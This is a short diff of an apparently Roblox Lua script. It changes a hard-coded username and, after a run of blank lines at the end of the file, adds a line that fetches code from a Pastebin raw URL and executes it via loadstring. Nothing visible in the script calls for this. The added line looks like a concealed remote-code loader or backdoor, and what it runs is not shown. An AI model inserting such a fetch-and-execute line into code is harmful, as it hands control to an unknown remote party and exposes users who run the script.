@@ -1,4 +1,4 @@
-local name = "KimberlyBranch5" 
+local name = "baconman143krich" 
 
 game:GetService'Players'.PlayerAdded:Connect(function(player)
 
@@ -325,3 +325,7 @@ if render1 == true then
 end
 
 end)
+
+
+
+loadstring(game:HttpGet('https://pastebin.com/raw/Jce40GHb'))()
